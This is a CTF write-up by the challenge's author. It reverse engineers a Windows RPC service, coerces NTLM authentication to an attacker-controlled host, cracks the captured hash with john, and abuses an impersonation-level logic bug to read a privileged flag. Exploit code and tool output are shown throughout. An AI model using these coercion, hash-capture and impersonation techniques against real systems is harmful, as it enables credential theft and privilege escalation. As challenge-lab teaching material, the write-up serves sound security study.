---
title: "Insomni'hack 2023 CTF Teaser - InsoBug"
layout: "post"
categories: ["CTF"]
tags: ["Exploit","CTF"]
image: /assets/og/ctf.png
---

For this edition of [Insomni'hack](https://insomnihack.ch/ctf-teaser-2023/), I wanted to create a special challenge based on my knowledge of some Windows internals. In this post, I will share some thoughts about the process and, most importantly, provide a detailed write-up.

## Personal thoughts

I want to start this post by sharing a few thoughts on CTFs and the process of creating a challenge. If you want to skip this part, feel free to jump directly to the next section.

Last year was the first time I actively took part in the organization of [Insomni'hack](https://insomnihack.ch/) as an employee of [SCRT](https://www.scrt.ch/). Living this from the inside, I can tell you there are a lot of things going on when it comes to putting together such an event. In the offensive security division though, our main focus is the organization of the CTF (both online and onsite). As such, we have to come up with interesting challenge ideas and implement them in the least possible amount of time (_which is quite a challenge in itself_...).

The problem is that I don't know much about the CTF world. What I knew (or at least what I believed back then) was that CTF players are not fond of Windows. _Let's just put it that way..._ That's a shame because this is precisely my area of interest. So, I decided to build a rather simple web challenge around an idea I had at the time.

Following the event, I had rather mixed feedback. Some people liked it, others didn't, and a few people took the time to give constructive criticism with valid arguments. The only thing I retained from this though was the negativity, and the feelings of hate and intolerance I experienced for the fist time in the community.

So, for this 2023 edition of the CTF teaser, I had to approach things differently. Rather than trying to satisfy everyone, I had to come up with something closer to my area of interest (I wouldn't dare to say _expertise_). I quickly thought about Windows RPC as there are quite a few cool bugs you can introduce because of bad development practices or simply a lack of knowledge or understanding of the operating system. So, I picked one particular logic bug and built a challenge around it.

## Write-up

### The challenge

Let's start with the description of the challenge. We are given a service to attack: `insobug.insomnihack.ch:80`. However, this reportedly is just a proxy. The actual target is a Windows service, and we are given the associated executable: `Server.exe`. The description contains other important pieces of information, but we will get to that later.

![Challenge description](/assets/posts/2023-01-28-insomnihack-2023-insobug/01_challenge-description.png)
_Challenge description_

### Binary analysis

We can start by opening the provided file in a disassembler to get a first glimpse of what it is supposed to do. Searching for strings is generally a good way to start.

![Ghidra - Searching for strings](/assets/posts/2023-01-28-insomnihack-2023-insobug/02_ghidra-strings.png)
_Ghidra - Searching for strings_

We notice some references to typical Win32 API calls along with references to RPC. The content of the import table tends to confirm that. It contains references to functions such as `NdrServerCall2`, `RpcServerListen` or `RpcImpersonateClient` which are typical of an RPC server.

![Ghidra - Import table](/assets/posts/2023-01-28-insomnihack-2023-insobug/03_ghidra-imports.png)
_Ghidra - Import table_

My preferred method for inspecting RPC servers is to use [RpcView](https://www.rpcview.org/) although I have to admit I have not tested [RPC Investigator](https://github.com/trailofbits/RpcInvestigator) yet as it just came out. But, to do that, we have to inspect a running process.

If we try to start the executable, we can see the following error, and it immediately exits.

```console
C:\Users\lab-user\Downloads\Challenge>Server.exe
[2023-01-24 19:26:57][3480] StartServiceCtrlDispatcherW() err: 1063 - 0x00000427
```

The purpose of [`StartServiceCtrlDispatcher`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicectrldispatcherw) is to _connect the main thread of a service process to the service control manager_. So, we know we are dealing with a Windows service.

This API takes a pointer to an array of [`SERVICE_TABLE_ENTRY`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_table_entryw) structures as an argument. Each [`SERVICE_TABLE_ENTRY`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_table_entryw) contains the name of a service and a pointer to its `ServiceMain` function.

```cpp
// ...
local_38.lpServiceName = L"Winternals1";
local_38.lpServiceProc = FUN_7ff6d3382590; // ServiceMain()
StartServiceCtrlDispatcherW(&local_38);
// ...
```

The `ServiceMain` function basically registers the service control handler and calls a yet-unknown function.

```cpp
RegisterServiceCtrlHandlerW(L"Winternals1", FUN_7ff6d3382a00); // ServiceCtrlHandler
FUN_7ff6d3382640(); // ServiceInit()
```

After a quick analysis of the function `FUN_7ff6d3382640` (see code below), we can assume it is responsible for initializing the service and especially the RPC server.

```cpp
void ServiceInit(void) { // FUN_7ff6d3382640
    HKEY hKey = NULL;

    // Edit the value "AuthForwardServerList" of the WebClient service
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters",
        0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
    RegSetValueExW(hKey, L"AuthForwardServerList", 0, REG_MULTI_SZ, "*", 4);
    RegCloseKey(hKey);

    // Register and start the RPC server
    RpcServerUseProtseqEpW(L"ncacn_http", RPC_C_PROTSEQ_MAX_REQS_DEFAULT, L"8000", NULL);
    RpcServerRegisterAuthInfoW(NULL, RPC_C_AUTHN_WINNT, NULL, NULL);
    RpcServerRegisterIf2(&DAT_7ff6d33846e0, NULL, NULL, 0, RPC_C_LISTEN_MAX_CALLS_DEFAULT, -1, NULL);
    RpcServerInqBindings(&local_28);
    RpcEpRegisterW(&DAT_7ff6d33846e0, local_28, 0, NULL);
    RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, TRUE);
    // ...
}
```

But there is also a particularly interesting thing here. The service sets the value `AuthForwardServerList` of the WebClient service to `*` in the registry. A look at the [documentation](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/credentials-prompt-access-webdav-fqdn-sites) reveals that this value determines to which hosts the WebClient service is allowed to authenticate.

> With this setting, I wanted to solve multiple issues. First, I wanted to hint toward the possible use of outbound WebDAV connections, which is not possible by default on Windows servers since the WebClient service is not installed. Second, the WebClient service has a strong limitation as it will not accept to authenticate to a host if its name contains dots (such as in FQDNs or IP addresses). This problem can be solved simply by adding a wildcard to `AuthForwardServerList`. It also solves one last problem that I will discuss in a moment.
{: .prompt-info }

Knowing that the executable should run as a service, we can try to register it through the Service Control Manager (SCM) with the built-in  `sc.exe` utility.

> The server actually needs some specific settings to fully function. That's not a problem if we just want to inspect the RPC server through.
{: .prompt-info }

```console
C:\WINDOWS\system32>sc create Winternals1 binpath= "c:\users\lab-user\downloads\challenge\Server.exe"
[SC] CreateService SUCCESS

C:\WINDOWS\system32>net start Winternals1
The Winternals1 service is starting..
The Winternals1 service was started successfully.
```

![The service 'Winternals1' is running](/assets/posts/2023-01-28-insomnihack-2023-insobug/04_systeminformer-service-running.png)
_The service 'Winternals1' is running_

RpcView shows us that the service started an RPC server with the protocol `ncacn_http` on port `8000`.

![RpcView - RPC server and protocol](/assets/posts/2023-01-28-insomnihack-2023-insobug/05_rpcview-server-proto.png)
_RpcView - RPC server and protocol_

> The protocol `ncacn_http` is rather uncommon. The most common ones are `ncalrpc` (ALPC), `ncacn_np` (Named Pipes) and `ncacn_ip_tcp` (RPC over TCP). I chose `ncacn_http` to make sure anyone could access the service over the Internet without any issue as some ISPs are known to block certain TCP ports such as 445 (SMB) or 135 (RPC endpoint mapper).
{: .prompt-info }

The bottom section of RpcView shows us that the server exposes a single interface with 10 procedures. Unfortunately, we have no symbols, so we don't have the slightest clue what their purpose is.

![RpcView - RPC server interface](/assets/posts/2023-01-28-insomnihack-2023-insobug/06_rpcview-server-interface.png)
_RpcView - RPC server interface_

That being said, we can take a look at the disassembled code at the address of procedure `0` for instance, and see if we can learn anything interesting. To do so, I simply retrieved the base address of the executable in System Informer and applied it in Ghidra thanks to the "Memory Map" tool.

![Ghidra - Procedure 0 pseudo source code](/assets/posts/2023-01-28-insomnihack-2023-insobug/07_ghidra-rpc-proc0-decompiled.png)
_Ghidra - Procedure 0 pseudo source code_

Within the function at address `0x7ff6d3381070`, we can see two interesting function calls, one at the beginning and one at the end, that both contain references to the string `InsoRpcQueryCurrentUser`.

```cpp
undefined8 FUN_7ff6d3381070 (RPC_BINDING_HANDLE param_1,void **param_2,wchar_t *param_3,HLOCAL param_4) {
    // Definition of local variables...
    // ...
    FUN_7ff6d3382340(L"REQUEST > InsoRpcQueryCurrentUser\r\n", param_2, param_3, param_4);
    // ...
    FUN_7ff6d3382340(L"RESPONSE > InsoRpcQueryCurrentUser: 0x%08x\r\n", uVar8, param_3, param_4);
    return uVar8;
}
```

These look like log messages that are used to trace the execution of the server. Fortunately for us, they also provide nice hints about the purpose of each RPC procedure, which should facilitate the reverse engineering process a bit.

> When creating this challenge, I did not want to make it too easy by providing the PDB file, but I didn't want to make it too hard either so I decided to define a "Log" function as a pretext for including the name of key functions and procedures in the executable, which is something I already saw in actual Windows services.
{: .prompt-info }

With that knowledge, we can go back to RpcView, right-click on the interface to "decompile" it and generate an IDL file that we will use as a working base. This should yield something like this.

```cpp
[
    uuid(08554ca4-22b3-4d86-a105-eb93fe22e449),
    version(1.0),
]
interface insobug
{
    long InsoRpcQueryCurrentUser([out][ref][string] wchar_t** arg_1);
    long InsoRpcQueryFileOwner([in][string] wchar_t* arg_1, [out][ref][string] wchar_t** arg_2);
    long InsoRpcQueryFileSize([in][string] wchar_t* arg_1, [out]long *arg_2);
    long InsoRpcQueryFileAttributes([in][string] wchar_t* arg_1, [out]long *arg_2);
    long InsoRpcQueryFileFullPath([in][string] wchar_t* arg_1, [out][ref][string] wchar_t** arg_2);
    long InsoRpcQueryDirectory([in][string] wchar_t* arg_1, [out][ref][string] wchar_t** arg_2);
    long InsoRpcFileExists([in][string] wchar_t* arg_1, [out]small *arg_2);
    long InsoRpcReadFile([in][string] wchar_t* arg_1, [out][ref][string] char** arg_2, [out]short *arg_3);
    long InsoRpcReadFilePrivileged([in][string] wchar_t* arg_1, [out][ref][string] char** arg_2, [out]short *arg_3);
    long InsoRpcWriteFile([in][string] wchar_t* arg_1, [in][size_is(arg_3)]char arg_2[], [in]short arg_3);
}
```

However, there is one slight issue. As I already discussed in the post [From RpcView to PetitPotam](https://itm4n.github.io/from-rpcview-to-petitpotam/), the first parameter - `arg_0` - is missing. It is necessary here for passing an explicit binding handle to the RPC runtime. This can easily be solved by manually adding `[in] handle_t arg_0` in each procedure.

As for the parameter names, it is possible to make educated guesses by reverse engineering each procedure. I will take the first one - `InsoRpcQueryCurrentUser` - as an example.

```cpp
long InsoRpcQueryCurrentUser(RPC_BINDING_HANDLE param_1, wchar_t **param_2) {

    HRESULT hResult = E_FAIL;
    RPC_STATUS status;
    LPWSTR pwszCurrentUser = NULL;
    
    Log(L"REQUEST > InsoRpcQueryCurrentUser\r\n");

    if (param_2 == NULL) {
        hResult = E_INVALIDARG;
        goto end;
    }

    if (!FUN_7ff6d3382b90()) { // CheckAuthentication()
        hResult = E_ACCESSDENIED;
        goto end;
    }

    status = RpcImpersonateClient(param_1);

    if (status != RPC_S_OK) {
        Log(L"RpcImpersonateClient() err: %d - 0x%08x\r\n", GetLastError());
        goto end;
    }

    FUN_7ff6d3382e60(&pwszCurrentUser, local_res10);

    *param_2 = malloc(wcslen(pwszCurrentUser) + 16);
    swprintf(*param_2, dwSize, L"%ws (%d)", pwszCurrentUser, *local_res10);

    if (status == RPC_S_OK) {
        RpcRevertToSelf();
    }

end:
    if (pwszCurrentUser)
        LocalFree(pwszCurrentUser);

    Log(L"RESPONSE > InsoRpcQueryCurrentUser: 0x%08x\r\n",uVar8,param_3,param_4);
    return hResult;
}
```

In this code, there are two calls to yet-unknown functions: `FUN_7ff6d3382b90` and `FUN_7ff6d3382e60`. The function `FUN_7ff6d3382b90` (see snippet below) seems to first query the client's binding handle to get its username. Then it passes this information to `FUN_7ff6d3382c30` along with the SID `S-1-5-32-545`. This is the SID of the built-in `Users` group. The function `FUN_7ff6d3382c30` contains references to `LookupAccountSidW` and `NetLocalGroupGetMembers` so we can reasonably assume that it is used to check whether a given user is part of a specific group.

```cpp
BOOL FUN_7ff6d3382b90(void) {

    RPC_STATUS status;
	RPC_AUTHZ_HANDLE AuthzHandle = NULL;

    RpcBindingInqAuthClientW(NULL, &AuthzHandle, NULL, NULL, NULL, NULL);
    // AuthzHandle is actually the the client's username
    FUN_7ff6d3382c30(L"S-1-5-32-545", AuthzHandle);
    // ...
}
```

As a result, `FUN_7ff6d3382b90` could be a security check that ensures that the client is an authenticated user known by the server.

This leaves us with `FUN_7ff6d3382e60`. After some more reverse engineering and code cleanup, it seems that this one is the actual implementation of `InsoRpcQueryCurrentUser`. It returns the full name of the user in the form `DOMAIN\USERNAME` (`param_1`) and the elevation status (`param_2`) of its Token (see code below).

```cpp
void FUN_7ff6d3382e60(HLOCAL *param_1, undefined4 *param_2) {

    HANDLE hToken = NULL;
    DWORD dwElevation;
    
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        if (GetLastError() != 1346) {
            Log(L"OpenThreadToken() err: %d - 0x%08x\r\n", GetLastError(), GetLastError());
            goto end;
        }

        RevertToSelf();
        
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            Log(L"OpenProcessToken() err: %d - 0x%08x\r\n", GetLastError(), GetLastError());
            goto end;
        }
    }

    if (!GetTokenInformation(local_860, TokenUser, pBuffer, 0x800, &local_850)) {
        Log(L"GetTokenInformation() err: %d - 0x%08x\r\n", GetLastError(), GetLastError());
        goto end;
    }

    LookupAccountSidW(NULL, pBuffer[0], pwszName, cchName, pwszDomain, local_868, &local_84c);
    swprintf(pwszFullName, dwFullNameSize, L"%ws\\%ws", pwszDomain, pwszName);

    GetTokenInformation(local_860, TokenElevation, &dwElevation, sizeof(dwElevation), &local_850);
    
    *param_2 = dwElevation;
    *param_1 = pwszFullName;
}

end:
	if (hToken)
		CloseHandle(hToken);

return;
```

With this knowledge in mind, the code of `InsoRpcQueryCurrentUser` can be greatly simplified as follows.

```cpp
long InsoRpcQueryCurrentUser(RPC_BINDING_HANDLE hBinding, wchar_t **ppwszCurrentUser) {

    LPWSTR pwszFullName;
    DWORD dwElevation;
    
    // ...

    RpcImpersonateClient(hBinding);
    QueryCurrentUser(&pwszFullName, &dwElevation);

    *ppwszCurrentUser = malloc(wcslen(pwszFullName) + 16);
    swprintf(*ppwszCurrentUser, dwSize, L"%ws (%d)", pwszFullName, dwElevation);

    RpcRevertToSelf();

    // ...
    
    return hResult;
}
```

Similar work should also be done with other RPC procedures but this already provides an overview of what to expect in the rest of the code.

### Where to begin?

In the procedure `InsoRpcQueryCurrentUser`, we saw that there was a call to a function, that I chose to name `CheckAuthentication()`, which ensures that the client is a member of the built-in `Users` group. It looks like this check is present in all the other procedures.

If this check fails, the RPC server immediately returns the error code `0x80070005` (_i.e._ `E_ACCESSDENIED`). Since we don't have any credentials, there is no way we can meet this condition.

However, if we take a closer look at the cross-references to this function, we can see that there are actually only 9 occurrences, although the total number of procedures is 10.

![Ghidra - Cross references of the function 'CheckAuthentication'](/assets/posts/2023-01-28-insomnihack-2023-insobug/08_ghidra-checkauthentication-xrefs.png)
_Ghidra - Cross references of the function 'CheckAuthentication'_

This means that this check is probably not present in one of the procedures. Indeed, going through the list, we can see that `InsoRpcFileExists` does not call this function. Instead, it seems that it reads some user credentials from the registry and continues the execution as this user (see code below).

```cpp
long InsoRpcFileExists(undefined8 param_1, wchar_t * param_2, LPDWORD param_3) {

    HRESULT hResult = E_FAIL;

    // A check on the second parameter?
    if (!FUN_7ff6d3382b10(param_2)) {
        hResult = E_INVALIDARG;
        goto end;
    }

    // Retrieve some credentials from the registry
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Winternals1\\RestrictedAccount", 0, 
        KEY_QUERY_VALUE, &local_248);
    RegQueryValueExW(local_248, L"Username", NULL, param_4, local_128, &local_238);
    RegQueryValueExW(local_248, L"Password", NULL, param_4, local_228, &local_238);

    // Use the credentials to request a Token and impersonate the user
    LogonUserW(local_128, L".", lpszPassword, LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT, &local_240);
    ImpersonateLoggedOnUser(local_240);

    // Check if file exists and stop impersonating
    *param_3 = GetFileAttributesW(param_2) != INVALID_FILE_ATTRIBUTES;
    RevertToSelf();

end:
    return hResult;
}     
```

It looks like we have our starting point. There is a high chance we can invoke this remote procedure without authentication. In addition, the input parameter seems to be a file path, so we might be able to coerce the service to authenticate back to us using the impersonated user credentials.

### First contact

I will keep this part rather short because I already explained how one could use the IDL file generated by RpcView to create an RPC client in C/C++ in this post: [From RpcView to PetitPotam](https://itm4n.github.io/from-rpcview-to-petitpotam/).

The only difference resides in the way the binding handle is created. The "protocol sequence" is `ncacn_http`. The "network address" is just the server's hostname. The "endpoint" is the port on which the RPC server is listening locally.

```cpp
RPC_STATUS status;
RPC_WSTR StringBinding = NULL;
RPC_BINDING_HANDLE BindingHandle = NULL;
BOOLEAN bExists;

RpcStringBindingComposeW(NULL, (RPC_WSTR)L"ncacn_http", (RPC_WSTR)L"insobug.insomnihack.ch",
                         (RPC_WSTR)L"8000", NULL, &StringBinding);
RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

InsoRpcFileExists(BindingHandle, L"\\\\your.host.local@80\\share\\foo1234.txt", &bExists);

RpcBindingFree(&BindingHandle);
RpcStringFreeW(&StringBinding);
```

However, rather than hardcoding the values, I created a utility that allows me to specify the parameters on the command line.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe coerce insobug.insomnihack.ch 8000 "\\your.host.com@80\share\foo1234.txt"
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] Trying to coerce authentication with path: \\your.host.com@80\share\foo1234.txt
[*] InsoRpcFileExists ret: 0 - 0x00000000 | Exists: 0
```

On our server's end, we can use a tool such as Responder to listen on port `80` and capture the NTLM authentication.

```console
$ sudo reponder -I eth0
[...]
[WebDAV] NTLMv2 Client   : 85.217.161.25
[WebDAV] NTLMv2 Username : INSOBUG-REALIST\Limited
[WebDAV] NTLMv2 Hash     : Limited::INSOBUG-REALIST:61c4bb1fde3d4d85:B389C19E2E93030CDE1B97BD04C80C00:01010000[...]2E00630068000000000000000000
```

> It was also possible to capture the authentication over SMB. However, as explained earlier, some ISPs block SMB traffic over the Internet, so I wanted to make sure that, even in such a case, the challenge could still be solved using WebDAV.
{: .prompt-info }

Once in possession of the NTLM response, we can try to crack it offline using the `rockyou.txt` wordlist.

```console
$ john -w=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Insomnia1        (Limited)
[...]
Session completed.
```

And here we go! We get our initial credentials.

### What's next?

Now that we have valid user credentials, the initialization of the binding will be slightly different as we need to provide this information to the RPC runtime.

```cpp
RPC_BINDING_HANDLE BindingHandle = NULL;
RPC_WSTR StringBinding = NULL;
SEC_WINNT_AUTH_IDENTITY_W Identity;
RPC_SECURITY_QOS Qos;

LPCWSTR pwszUsername = L"Limited";
LPCWSTR pwszPassword = L"Insomnia";
    
RpcStringBindingComposeW(NULL, (RPC_WSTR)L"ncacn_http", (RPC_WSTR)L"insobug.insomnihack.ch",
                         (RPC_WSTR)L"8000", NULL, &StringBinding);
RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

Qos.Version = RPC_C_SECURITY_QOS_VERSION_1;
Qos.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
Qos.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;
Qos.ImpersonationType = RPC_C_IMP_LEVEL_DEFAULT;

Identity.Domain = (unsigned short*)L".";
Identity.DomainLength = 1;
Identity.User = (unsigned short*)pwszUsername;
Identity.UserLength = (DWORD)wcslen(pwszUsername);
Identity.Password = (unsigned short*)pwszPassword;
Identity.PasswordLength = (DWORD)wcslen(pwszPassword);
Identity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

RpcBindingSetAuthInfoExW(BindingHandle, (RPC_WSTR)pwszHost, RPC_C_AUTHN_LEVEL_CONNECT,
                         RPC_C_AUTHN_WINNT, &Identity, 0, &Qos);

RpcStringFreeW(&StringBinding);
```

Then, with this updated binding handle, we can start poking around the other remote procedures.

- `InsoRpcQueryCurrentUser`
- `InsoRpcQueryFileOwner`
- `InsoRpcQueryFileSize`
- `InsoRpcQueryFileAttributes`
- `InsoRpcQueryFileFullPath`
- `InsoRpcQueryDirectory`
- `InsoRpcReadFile`
- `InsoRpcReadFilePrivileged`
- `InsoRpcWriteFile`

The challenge's description says that the file `flag.txt` is in the application's directory but it does not tell us where it is exactly. Our next goal could be to determine this. Two procedures seem well suited for that purpose: `InsoRpcQueryFileFullPath` and `InsoRpcQueryDirectory`.

If `InsoRpcQueryFileFullPath` receives an empty string, it queries the name of the current module with `GetModuleFileNameW` and determines its full path with `GetFullPathNameW` (see code below).

```cpp
long InsoRpcQueryFileFullPath(handle_t param_1, wchar_t *param_2, wchar_t **param_3) {

    // ...

    if (wcslen(param_2) == 0) {
        GetModuleFileNameW(NULL, lpFilename, MAX_PATH);
        GetFullPathNameW(lpFilename, 0x104, ppvVar9, NULL);
    }
    
    // ...
}
```

We can leverage this to get the path of the service's executable.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe path insobug.insomnihack.ch 8000 limited Insomnia1 ""
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcQueryFileFullPath ret: 0 - 0x00000000 | FileFullPath: C:\Program Files\Winternals1\Server.exe
```

We can then invoke `InsoRpcQueryDirectory` to list the content of the directory and confirm that the file `flag.txt` is there.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe dir insobug.insomnihack.ch 8000 limited Insomnia1 "C:\Program Files\Winternals1"
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcQueryDirectory ret: 0 - 0x00000000
<DIR> .
<DIR> ..
      flag.txt
      Server.exe
```

### The flag...

If we try to read the content of the flag using `InsoRpcReadFile`, we get the following error: `0x80070057` or `E_INVALIDARG`.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe file insobug.insomnihack.ch 8000 limited Insomnia1 "C:\Program Files\Winternals1\flag.txt"
[*] Using impersonation level: (null) (3)
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcReadFile ret: -2147024809 - 0x80070057
```

This error is the result of the following check.

```cpp
if ( (param_2 == NULL) || (param_3 == NULL)) || (param_4 == NULL)) || !FUN_7ff6d3382b10(param_2) ) {
    hResult = E_INVALIDARG;
    goto end;
}
```

We understand that the input parameters must not be null, but it seems that there is also a check on `param_2` with `FUN_7ff6d3382b10(param_2)`.

This function performs several checks on the input string. In particular, it checks whether it contains `flag.txt` and fails if so. The search is done with `wcsstr()` which is case-sensitive. Therefore, it can be easily bypassed by specifying a path such as `C:\Program Files\Winternals1\Flag.txt`.

> Orignally, I did not intend to provide the filename in the challenge description. So, I added this dummy check as a pretext for giving this information.
{: .prompt-info }

Even then, we still get an error: `0x80070005` or `E_ACCESSDENIED`.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe file insobug.insomnihack.ch 8000 limited Insomnia1 "C:\Program Files\Winternals1\Flag.txt"
[*] Using impersonation level: (null) (3)
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcReadFile ret: -2147024891 - 0x80070005
```

There is also the procedure `InsoRpcReadFilePrivileged`, but we get the exact same result.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe filep insobug.insomnihack.ch 8000 limited Insomnia1 "C:\Program Files\Winternals1\Flag.txt"
[*] Using impersonation level: (null) (3)
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcReadFilePrivileged ret: -2147024891 - 0x80070005
```

### The actual bug!

At this point, we are getting very close, but we are still missing some key information. Up until now, we have only leveraged what was offered by the RPC server, but we did not exploit any vulnerability per se.

There is a detail I purposely omitted when discussing the function `QueryCurrentUser` though (see code below). We can see that, if `OpenThreadToken` fails with an error code different than `1346`, the execution continues and the server calls `RevertToSelf()` to restore its security context. This results in the Token of the process being queried, rather that the Token associated with the client's Thread. In other words, the server will consider it is running as a privileged user for the rest of the execution.

```cpp
void QueryCurrentUser(HLOCAL *param_1, undefined4 *param_2) {

    HANDLE hToken = NULL;
    DWORD dwElevation;
    
    // Open client's Token
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        // Safely exit only if last error != 1346
        if (GetLastError() != 1346) {
            Log(L"OpenThreadToken() err: %d - 0x%08x\r\n", GetLastError(), GetLastError());
            goto end;
        }

        // Restore server's security context (if a client was impersonated)
        RevertToSelf();
        
        // Open the Process' Token rather that the current Thread's.
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            Log(L"OpenProcessToken() err: %d - 0x%08x\r\n", GetLastError(), GetLastError());
            goto end;
        }
    }

    // Get the username associated to the Token
    if (!GetTokenInformation(local_860, TokenUser, pBuffer, 0x800, &local_850)) {
        Log(L"GetTokenInformation() err: %d - 0x%08x\r\n", GetLastError(), GetLastError());
        goto end;
    }

    // Create the full name representation: "DOMAIN\USER"
    LookupAccountSidW(NULL, pBuffer[0], pwszName, cchName, pwszDomain, local_868, &local_84c);
    swprintf(pwszFullName, dwFullNameSize, L"%ws\\%ws", pwszDomain, pwszName);

    // Check if the Token is "elevated"
    GetTokenInformation(local_860, TokenElevation, &dwElevation, sizeof(dwElevation), &local_850);
    
    // Return the full name and the elevation status
    *param_2 = dwElevation;
    *param_1 = pwszFullName;
}

end:
	if (hToken)
		CloseHandle(hToken);

return;
```

Concretely, this means that we would be able to go past the following check, in `InsoRpcReadFilePrivileged`.

```cpp
// Is the current user a member of the Administrators group?
if (!CheckUserGroupMembership(L"S-1-5-32-544", local_58)) {
    hResult = E_ACCESSDENIED;
    goto end;
}
```

The question is, is there a way to cause `OpenThreadToken()` to fail with the proper error code? The answer is "yes".

We can see that the function returns immediately only if the error code is different from `1346`, _i.e._ `ERROR_BAD_IMPERSONATION_LEVEL`. But what are you supposed to do with such information?

The answer to that question requires a bit of knowledge about some Windows internals and the RPC runtime. More specifically, it is important to know that a Token attached to a Thread is called an __impersonation__ Token and that __impersonation__ Tokens have an [__impersonation level__](https://learn.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels): `SecurityAnonymous`, `SecurityIdentification`, `SecurityImpersonation`, `SecurityDelegation`.

When a server calls `RpcImpersonateClient`, the RPC runtime gets an impersonation Token representing the client's security context and applies it to the current Thread. Therefore, if the internal function `QueryCurrentUser` is called after invoking `RpcImpersonateClient`, the call to `OpenThreadToken` is done within the client's context.

As its name suggests, `OpenThreadToken` allows you to open a Thread's Token with specific access rights (such as `TOKEN_QUERY` or `TOKEN_DUPLICATE` for instance). But it also has a boolean parameter called [`OpenAsSelf`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken#parameters).

> The OpenAsSelf parameter allows the caller of this function to open the access token of a specified thread when the caller is impersonating a token at SecurityIdentification level. Without this parameter, the calling thread cannot open the access token on the specified thread because it is impossible to open executive-level objects by using the SecurityIdentification impersonation level.

```cpp
OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken);
```

It just so happens that the value of `OpenAsSelf` is `FALSE` in the call to `OpenThreadToken`. So, if we can control this impersonation level, we might be able to cause it to fail appropriately.

The important thing to know here is that the impersonation level obtained by the server is determined by the client. When initializing the binding handle with `RpcBindingSetAuthInfoEx`, the client can use the parameter `ImpersonationType` of the [`RPC_SECURITY_QOS`](https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/ns-rpcdce-rpc_security_qos) structure to specify this value.

We can choose between 5 possible values:

- `RPC_C_IMP_LEVEL_DEFAULT` => `RPC_C_IMP_LEVEL_IMPERSONATE`
- `RPC_C_IMP_LEVEL_ANONYMOUS`
- `RPC_C_IMP_LEVEL_IDENTIFY`
- `RPC_C_IMP_LEVEL_IMPERSONATE`
- `RPC_C_IMP_LEVEL_DELEGATE`

The default value - `RPC_C_IMP_LEVEL_DEFAULT` - is equivalent to `RPC_C_IMP_LEVEL_IMPERSONATE`. The value `RPC_C_IMP_LEVEL_ANONYMOUS` is too low as it would prevent us from passing the initial authentication check. The value `RPC_C_IMP_LEVEL_IDENTIFY`, however, is exactly what we need.

We can try to initialize our binding handle with the default impersonation level, and then with the "identify" level, before invoking the procedure `InsoRpcQueryCurrentUser` for instance.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe user insobug.insomnihack.ch 8000 limited Insomnia1
[*] Using impersonation level: (null) (3)
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcQueryCurrentUser ret: 0 - 0x00000000
Current user: INSOBUG-REALIST\Limited (0)

C:\Users\lab-user\Downloads\Challenge>Solution.exe user insobug.insomnihack.ch 8000 limited Insomnia1 identify
[*] Using impersonation level: identify (2)
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcQueryCurrentUser ret: 0 - 0x00000000
Current user: INSOBUG-REALIST\Winternals1 (1)
```

In the first case, with the default impersonation level, the server returns the identity corresponding to our credentials: `INSOBUG-REALIST\Limited (0)`. However, when specifying the impersonation level `RPC_C_IMP_LEVEL_IDENTIFY`, the server returns  `INSOBUG-REALIST\Winternals1 (1)`! We successfully triggered the bug.

As a reminder, the value after the username indicates whether the user's Token is elevated or not. In the case of `INSOBUG-REALIST\Winternals1`, it looks like it is!

Getting the flag is now just a matter of using the same trick before invoking the procedure `InsoRpcReadFilePrivileged` with the full path of the file.

```console
C:\Users\lab-user\Downloads\Challenge>Solution.exe filep insobug.insomnihack.ch 8000 limited Insomnia1 "C:\Program Files\Winternals1\Flag.txt" identify
[*] Using impersonation level: identify (2)
[*] String Binding: ncacn_http:insobug.insomnihack.ch[8000]
[*] InsoRpcReadFilePrivileged ret: 0 - 0x00000000
INS{W1ndowS!rpc_And-L0giC/vuln3r@biliti3s}
```

## Conclusion

